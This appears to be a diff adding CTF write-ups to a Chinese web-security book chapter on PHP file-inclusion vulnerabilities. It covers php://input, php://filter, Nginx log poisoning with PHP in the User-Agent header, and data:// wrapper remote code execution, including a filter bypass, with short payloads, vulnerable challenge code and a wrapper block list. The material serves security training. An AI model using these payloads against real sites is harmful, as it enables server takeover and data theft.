@@ -417,3 +417,183 @@ Connection: close
 - `/proc/self/fd/`：是一个目录，包含当前进程打开的文件描述符的符号链接列表。
 
 通过读取这些文件，可以获取关于进程的详细信息，方便进行调试和监控。在给定上下文中，对于 Docker 容器，`/proc` 中的信息可以用于发现容器内部的运行时信息，如进程启动命令、环境变量等。
+
+## 实战
+
+<!-- Imported from D:\\Book\\Web\\Chapter7\7-1.md -->
+### input
+
+话不多说，直接上题（BugKu CTF）
+
+![](https://pic1.imgdb.cn/item/67b1797cd0e0a243d4ffc351.jpg)
+
+打开页面给出了源代码
+
+![](https://pic1.imgdb.cn/item/67b1798ad0e0a243d4ffc355.jpg)
+
+`extract()` 函数从数组中将变量导入到当前的符号表，该函数使用数组键名作为变量名，使用数组键值作为变量值
+
+![](https://pic1.imgdb.cn/item/67b179a1d0e0a243d4ffc359.jpg)
+
+`empty()` 函数判断是否为空，空为 `False`
+
+`trim()` 函数移除字符串两侧的空白字符或其他预定义字符
+
+`file_get_contents()` 把整个文件读入一个字符串中
+
+![](https://pic1.imgdb.cn/item/67b179bcd0e0a243d4ffc35c.jpg)
+
+由此可以看出这里存在一个文件包含漏洞，我们可以结合 PHP 伪协议
+
+`php://input` 在 POST 请求中访问其中的 `data` 部分，我们可以 GET 传入 `ac` 值，fn 为伪协议，最后 POST 传入 `ac` 值使条件成立
+
+![](https://pic1.imgdb.cn/item/67b17a0cd0e0a243d4ffc363.jpg)
+
+
+<!-- Imported from D:\\Book\\Web\\Chapter7\7-2.md -->
+### filter
+
+话不多说，直接上题（BugKu CTF）
+
+![](https://pic1.imgdb.cn/item/67b17a79d0e0a243d4ffc36e.jpg)
+
+打开网页有个链接
+
+![](https://pic1.imgdb.cn/item/67b17a89d0e0a243d4ffc376.jpg)
+
+点击进去发现 URL 路径变成了 file 参数
+
+![](https://pic1.imgdb.cn/item/67b17aa7d0e0a243d4ffc37a.jpg)
+
+使用 PHP 伪协议读取源码
+
+php://filter 用于读取源代码并输出，convert.base64-encode 进行 Base64 编码输出，resource 指定读取文件
+
+![](https://pic1.imgdb.cn/item/67b17ac9d0e0a243d4ffc37f.jpg)
+
+解码拿到 flag
+
+![](https://pic1.imgdb.cn/item/67b17aead0e0a243d4ffc381.jpg)
+
+
+<!-- Imported from D:\\Book\\Web\\Chapter7\7-3.md -->
+### Nginx 日志 RCE
+
+话不多说，直接上题（青少年 CTF 练习平台）
+
+![](https://pic1.imgdb.cn/item/68393d1c58cb8da5c81c5769.png)
+
+打开网页给出了源码
+
+![](https://pic1.imgdb.cn/item/68393d3d58cb8da5c81c587a.png)
+
+文件包含是没有任何过滤的，但是没有 `/flag` 文件
+
+![](https://pic1.imgdb.cn/item/68393d5558cb8da5c81c5980.png)
+
+分析架构为 Nginx 服务器
+
+![](https://pic1.imgdb.cn/item/68393dd058cb8da5c81c5d82.png)
+
+尝试访问日志文件 `/var/log/nginx/error.log` 和 `/var/log/nginx/access.log`
+
+![](https://pic1.imgdb.cn/item/68393ec158cb8da5c81c625b.png)
+
+发现 `access.log` 被设置为了 UA 头
+
+![](https://pic1.imgdb.cn/item/68393eda58cb8da5c81c62c7.png)
+
+于是我们可以改 UA 头为 PHP 代码
+
+```php+HTML
+User-Agent: <?php echo system('ls');?>
+```
+
+![](https://pic1.imgdb.cn/item/6839434158cb8da5c81c7a54.png)
+
+再查看 `flag.php`
+
+```php+HTML
+User-Agent: <?php system('cat flag.php');?>
+```
+
+![](https://pic1.imgdb.cn/item/6839447e58cb8da5c81c7fc8.png)
+
+
+<!-- Imported from D:\\Book\\Web\\Chapter7\7-4.md -->
+### data 伪协议 RCE
+
+话不多说，直接上题（攻防世界）
+
+![](https://pic1.imgdb.cn/item/6808c71f58cb8da5c8c67481.png)
+
+打开网页给出了源代码
+
+`strstr()` 用于查找字符串首次出现的位置（区分大小写）
+
+`str_replace()` 以其他字符替换字符串中的一些字符（区分大小写）
+
+```php
+<?php
+show_source(__FILE__);
+echo $_GET['hello'];
+$page=$_GET['page'];
+while (strstr($page, "php://")) {
+    $page=str_replace("php://", "", $page);
+}
+include($page);
+?>
+```
+
+虽然禁用了 `php://` 伪协议，但是 `data://` 还可以使用
+
+如果传入的数据是 PHP 代码，就会执行代码，用法如下：
+
+```php
+data://text/plain;base64,xxxx(base64 编码后的数据)
+```
+
+或者
+
+```php
+data://text/plain,xxx(数据)
+```
+
+![](https://pic1.imgdb.cn/item/6808cbee58cb8da5c8c681d5.png)
+
+
+<!-- Imported from D:\\Book\\Web\\Chapter7\7-5.md -->
+### data 伪协议 RCE 绕过双斜杠
+
+话不多说，直接上题（青少年 CTF 练习平台）
+
+![](https://pic1.imgdb.cn/item/683d81d058cb8da5c82526cb.png)
+
+打开网页给出了源码
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+
+if(isset($_GET['file'])){
+        $file = $_GET['file'];
+}
+// 假如我增加了过滤，你又该如何应对呢？
+if(preg_match('/php:\/\/|file:\/\/|flag|http:\/\/|log|phar:\/\/|data:\/\//i', $file)){
+        echo 'No No No !';
+}
+else{
+        include $file;
+}
+```
+
+![](https://pic1.imgdb.cn/item/683d81f258cb8da5c82526e6.png)
+
+这里的正则只匹配了 `data://`，没有过滤整个 `data` 伪协议，所以我们去掉 `//` 即可绕过
+
+```php
+?file=data:text/plain,<?php system('cat /fl\ag');?>
+```
+
+![](https://pic1.imgdb.cn/item/683d82ad58cb8da5c8252740.png)
